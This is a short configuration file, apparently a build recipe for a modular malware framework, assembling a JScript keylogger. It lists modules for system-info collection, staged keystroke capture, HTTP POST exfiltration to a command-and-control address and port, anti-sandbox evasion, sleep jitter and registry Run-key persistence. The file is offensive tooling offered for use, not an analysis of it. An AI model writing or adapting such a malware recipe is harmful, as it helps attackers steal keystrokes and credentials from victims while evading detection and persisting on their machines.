name: js_keylogger_persist
description: Persistent keylogger with registry persistence and HTTP exfil
format: jscript

core:
  - core/emit_buffer
  - core/run_cmd
  - core/file_ops

collectors:
  - collectors/sysinfo

keylogger: collectors/keylogger_staged

exfil: exfil/http_post
arch: arch/keylogger

evasion:
  - evasion/anti_sandbox
  - evasion/sleep_jitter

persist:
  - persist/registry_run

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
  KEYLOG_DURATION: "300"
